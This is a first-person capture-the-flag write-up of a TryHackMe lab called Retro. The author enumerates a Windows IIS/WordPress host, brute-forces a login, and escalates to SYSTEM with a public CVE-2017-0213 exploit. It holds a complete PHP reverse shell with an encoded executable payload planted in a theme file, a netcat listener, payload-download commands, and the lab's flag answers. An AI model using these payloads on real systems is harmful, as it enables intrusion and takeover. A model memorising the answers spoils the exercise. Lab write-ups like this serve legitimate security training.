#CTF #THM

This appears to be the last module in this Section.  I'm not really sure what it is, but it mentions a website.

Task1 - Pwn
-------------------

Doing a portscan:

```bash
# threader3000

------------------------------------------------------------
        Threader 3000 - Multi-threaded Port Scanner          
                       Version 1.0.7                    
                   A project by The Mayor               
------------------------------------------------------------
Enter your target IP address or URL here: 10.10.133.56
------------------------------------------------------------
Scanning target 10.10.133.56
Time started: 2022-11-24 06:00:10.777497
------------------------------------------------------------
Port 80 is open
Port 3389 is open
Port 5985 is open
Port scan completed in 0:01:38.690054
------------------------------------------------------------
Threader3000 recommends the following Nmap scan:
************************************************************
nmap -p80,3389,5985 -sV -sC -T4 -Pn -oA 10.10.133.56 10.10.133.56
************************************************************
Would you like to run Nmap or quit to terminal?
------------------------------------------------------------
1 = Run suggested Nmap scan
2 = Run another Threader3000 scan
3 = Exit to terminal
------------------------------------------------------------
Option Selection: 1
nmap -p80,3389,5985 -sV -sC -T4 -Pn -oA 10.10.133.56 10.10.133.56

Starting Nmap 7.60 ( https://nmap.org ) at 2022-11-24 06:02 GMT
Nmap scan report for ip-10-10-133-56.eu-west-1.compute.internal (10.10.133.56)
Host is up (0.00031s latency).

PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=RetroWeb
| Not valid before: 2022-11-23T05:48:02
|_Not valid after:  2023-05-25T05:48:02
|_ssl-date: 2022-11-24T06:02:30+00:00; +1s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
MAC Address: 02:05:4C:66:32:FB (Unknown)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.87 seconds
------------------------------------------------------------
Combined scan completed in 0:02:19.369938
Press enter to quit...
```

Ok, looks like we have a Windows Server here running  web server and some RDP service on 3389/tcp.

Checking out website:
![[retro1 1.png]]

Looks like a standard unconfigured IIS website.

I will run gobuster on it:
```bash
# gobuster dir -u http://10.10.133.56 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.133.56
[+] Threads:        40
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2022/11/24 06:14:15 Starting gobuster
===============================================================
/retro (Status: 301)
/Retro (Status: 301)
===============================================================
2022/11/24 06:14:47 Finished
===============================================================
```

So we see /retro and /Retro.

Going to the /retro link I see an arcade fan page. 
![[retro2.png]]

Scrolling down to the bottom of the page I see a login link which takes me to an internal Wordpress site:

http://10.10.133.56/retro/wp-login.php

![[retro3.png]]

So we see that we can enumerate the Username after trying initially admin:admin:

![[retro4.png]]

Let's try wpscan:

```bash
# wpscan --url http://10.10.133.56/retro/wp-login.php -e u
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.7
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o, default: [N]
[+] URL: http://10.10.133.56/retro/wp-login.php/ [10.10.133.56]
[+] Started: Thu Nov 24 06:31:51 2022

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Microsoft-IIS/10.0
 |  - X-Powered-By: PHP/7.1.29
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] WordPress readme found: http://10.10.133.56/retro/wp-login.php/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] This site seems to be a multisite
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | Reference: http://codex.wordpress.org/Glossary#Multisite

[+] The external WP-Cron seems to be enabled: http://10.10.133.56/retro/wp-login.php/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.2.1 identified (Insecure, released on 2019-05-21).
 | Found By: Most Common Wp Includes Query Parameter In Homepage (Passive Detection)
 |  - http://10.10.133.56/retro/wp-includes/css/dashicons.min.css?ver=5.2.1
 | Confirmed By:
 |  Common Wp Includes Query Parameter In Homepage (Passive Detection)
 |   - http://10.10.133.56/retro/wp-includes/css/buttons.min.css?ver=5.2.1
 |  Query Parameter In Install Page (Aggressive Detection)
 |   - http://10.10.133.56/retro/wp-includes/css/dashicons.min.css?ver=5.2.1
 |   - http://10.10.133.56/retro/wp-includes/css/buttons.min.css?ver=5.2.1
 |   - http://10.10.133.56/retro/wp-admin/css/forms.min.css?ver=5.2.1
 |   - http://10.10.133.56/retro/wp-admin/css/l10n.min.css?ver=5.2.1

[i] The main theme could not be detected.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:21 <==> (10 / 10) 100.00% Time: 00:00:21

[i] No Users Found.

[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up

[+] Finished: Thu Nov 24 06:33:04 2022
[+] Requests Done: 66
[+] Cached Requests: 8
[+] Data Sent: 17.064 KB
[+] Data Received: 141.81 KB
[+] Memory used: 120.164 MB
[+] Elapsed time: 00:01:12
```

Ok no usernames found there but while that was running I checked out the /Retro link. It seems to be the same, but on second review, I noticed that authors name 'wade' and gave that a shot and he does indeed exist on the system:

![[retro5.png]]

So I will try the wp scan again with the passwords option to see if I can brute force it:

I put the username wade in the users.txt file and ran it as below:
```bash
# wpscan --url http://10.10.133.56/retro/wp-login.php --usernames users.txt --passwords /usr/share/wordlists/rockyou.txt 
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.7
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o, default: [N]
[+] URL: http://10.10.133.56/retro/wp-login.php/ [10.10.133.56]
[+] Started: Thu Nov 24 06:39:36 2022

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Microsoft-IIS/10.0
 |  - X-Powered-By: PHP/7.1.29
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] WordPress readme found: http://10.10.133.56/retro/wp-login.php/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] This site seems to be a multisite
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | Reference: http://codex.wordpress.org/Glossary#Multisite

[+] The external WP-Cron seems to be enabled: http://10.10.133.56/retro/wp-login.php/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.2.1 identified (Insecure, released on 2019-05-21).
 | Found By: Most Common Wp Includes Query Parameter In Homepage (Passive Detection)
 |  - http://10.10.133.56/retro/wp-includes/css/dashicons.min.css?ver=5.2.1
 | Confirmed By:
 |  Common Wp Includes Query Parameter In Homepage (Passive Detection)
 |   - http://10.10.133.56/retro/wp-includes/css/buttons.min.css?ver=5.2.1
 |  Query Parameter In Install Page (Aggressive Detection)
 |   - http://10.10.133.56/retro/wp-includes/css/dashicons.min.css?ver=5.2.1
 |   - http://10.10.133.56/retro/wp-includes/css/buttons.min.css?ver=5.2.1
 |   - http://10.10.133.56/retro/wp-admin/css/forms.min.css?ver=5.2.1
 |   - http://10.10.133.56/retro/wp-admin/css/l10n.min.css?ver=5.2.1

[i] The main theme could not be detected.

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:28 <===> (22 / 22) 100.00% Time: 00:00:28

[i] No Config Backups Found.

[+] Performing password attack on Wp Login against 1 user/s
Trying wade / hellokitty Time: 00:01:15 <> (216 / 14344391)  0.00%  ETA: ??:??:?Trying wade / christopher Time: 00:01:32 <> (266 / 14344391)  0.00%  ETA: ??:??:Trying wade / 0123456789 Time: 00:01:34 <> (270 / 14344391)  0.00%  ETA: ??:??:?Trying wade / volleyball Time: 00:01:46 <> (306 / 14344391)  0.00%  ETA: ??:??:?Trying wade / chrisbrown Time: 00:01:49 <> (317 / 14344391)  0.00%  ETA: ??:??:?Trying wade / strawberry Time: 00:01:51 <> (324 / 14344391)  0.00%  ETA: ??:??:?Trying wade / qwertyuiop Time: 00:01:56 <> (338 / 14344391)  0.00%  ETA: ??:??:?Trying wade / harrypotter Time: 00:01:58 <> (340 / 14344391)  0.00%  ETA: ??:??:Trying wade / sweetheart Time: 00:02:25 <> (421 / 14344391)  0.00%  ETA: ??:??:?Trying wade / 12345678910 Time: 00:02:29 <> (432 / 14344391)  0.00%  ETA: ??:??:Trying wade / manchester Time: 00:02:48 <> (489 / 14344391)  0.00%  ETA: ??:??:?Trying wade / linkinpark Time: 00:02:53 <> (502 / 14344391)  0.00%  ETA: ??:??:?Trying wade / bestfriend Time: 00:03:02 <> (528 / 14344391)  0.00%  ETA: ??:??:?Trying wade / estrellita Time: 00:03:15 <> (568 / 14344391)  0.00%  ETA: ??:??:?Trying wade / california Time: 00:03:26 <> (597 / 14344391)  0.00%  ETA: ??:??:?Trying wade / friendster Time: 00:03:34 <> (622 / 14344391)  0.00%  ETA: ??:??:?Trying wade / bestfriends Time: 00:03:50 <> (669 / 14344391)  0.00%  ETA: ??:??:Trying wade / daddysgirl Time: 00:03:56 <> (686 / 14344391)  0.00%  ETA: ??:??
[..]
```

This has been running forever.. I am guessing the password probably won't be in the rockyou.txt wordlist or they would have chosen something up higher in the list? I dunno.. while that's running I'm going to enumerate the website again and see if I can spot something that might be used as a password.

Hmm, well I have tried so many words here.. Tron, HighScore, Arcade, etc.

I found this post from Wade tho..
![[retro6.png]]

I must confess, I have never seen this movie. I guess I should watch it.  I looked it up on Wikipedia:

```
## Cast[[edit](https://en.wikipedia.org/w/index.php?title=Ready_Player_One_(film)&action=edit&section=2 "Edit section: Cast")]

-   [Tye Sheridan](https://en.wikipedia.org/wiki/Tye_Sheridan "Tye Sheridan") as Wade Watts / Parzival[[11]](https://en.wikipedia.org/wiki/Ready_Player_One_(film)#cite_note-SheridanCast-11)
```

So the main character is  Ty Sheridan as Wade Watts.. I see now what he means that his name is the same. I guess Parzival is the name of the character. I'll try that. My scan is still running.

![[retro7.png]]

Oh man.. I was beginning to think I would never get this.

Before I jump to putting a reverse shell in here, I just wanted to quickly check if that RDP would allow this same user password.

Yes it did!!

![[retro8.png]]

And there is our 2nd flag:
3b99fbdc6d430bfb51c72c651a261927

Doing some enumeration and trying to escalate as Wade isn't proving fruitful.  Even not having luck downloading PowerUp.ps1 or anything like that.

I've decided to try and put a reverse-shell in the wordpress.

Using this windows version shell php script:
https://github.com/Dhayalanb/windows-php-reverse-shell

```php
<?php

header('Content-type: text/plain');
$ip   = "tun0"; //change this 
$port = "4444"; //change this
$payload = "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";
$evalCode = gzinflate(base64_decode($payload));
$evalArguments = " ".$port." ".$ip;
$tmpdir ="C:\inetpub\wwwroot\retro\wp-content\themes\90s-retro";
chdir($tmpdir);
$res .= "Using dir : ".$tmpdir;
$filename = "D3fa1t_shell.exe";
$file = fopen($filename, 'wb');
fwrite($file, $evalCode);
fclose($file);
$path = $filename;
$cmd = $path.$evalArguments;
$res .= "\n\nExecuting : ".$cmd."\n";
echo $res;
$output = system($cmd);
			            
?>
```

I put that on the 404.php then started a listener:

```bash
┌──(kali㉿kali)-[~]
└─$ rlwrap nc -nvlp 4444
listening on [any] 4444 ...
```

Then called it from here:
http://10.10.75.20/retro/wp-content/themes/90s-Retro/404.php

```bash
connect to [tun0] from (UNKNOWN) [10.10.75.20] 49879
b374k shell : connected

Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\inetpub\wwwroot\retro\wp-content\themes\90s-Retro>whoami
whoami
nt authority\iusr

C:\inetpub\wwwroot\retro\wp-content\themes\90s-Retro>
```

Check privs:

```shell-session
whoami /all

USER INFORMATION
----------------

User Name         SID     
================= ========
nt authority\iusr S-1-5-17


GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes                                        
==================================== ================ ============ ==================================================
Mandatory Label\High Mandatory Level Label            S-1-16-12288                                                   
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Group used for deny only                          
CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group


PRIVILEGES INFORMATION
----------------------

Privilege Name          Description                               State  
======================= ========================================= =======
SeChangeNotifyPrivilege Bypass traverse checking                  Enabled
SeImpersonatePrivilege  Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege Create global objects                     Enabled

ERROR: Unable to get user claims information.
```

I will try this JuicyPotato attack:
https://github.com/ohpe/juicy-potato/releases/tag/v0.1

https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe

Then host it with python:
```bash 
python3 -m http.server 80
```

```powershell
Invoke-WebRequest http://tun0/JuicyPotato.exe -outfile jp.exe
```

I am stuck here. I am unable to get this server to download anything lol. I am pretty sure its trashed due to my experiments with the reverse-shell.

I'll have to restart this later.

Ok after dinner at a coffee shop on my laptop and using the Attackbox. 

I have been thinking that maybe some methods are being blocked. I don't know but I'm going to try another method all together, and see if I can find some kind of Kernel exploit or something.

I did noticed that from RDP earlier I could download stuff to the Wade user. Let's go from what works.

I found an exploit here:
https://github.com/SecWiki/windows-kernel-exploits/raw/master/CVE-2017-0213/CVE-2017-0213_x64.zip

Put it in a directory on the attackbox and started a python web server:
```bash
root@ip-10-10-192-222:~/code# ls
CVE-2017-0213_x64.exe
root@ip-10-10-192-222:~/code# python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) 
```

I just opened the web browser:
![[retro9.png]]

Downloaded that fine.

Now run the executable and I get a cmd shell with nt auth:
![[retro10.png]]

And the final flag is on the Admin's Desktop:
![[retro11.png]]

Man this seems off. I can't understand why powershell wouldn't work at all. Is the VM broken or did they make it like that on purpose? 

I guess the lesson learned here is if something isn't working let go and try another way sooner. 


__Questions__

A web server is running on the target. What is the hidden directory which the website lives on?
Answer: _/retro_

user.txt:
Answer: _3b99fbdc6d430bfb51c72c651a261927_

root.txt:
Answer: _7958b569565d7bd88d10c6f22d1c4063_
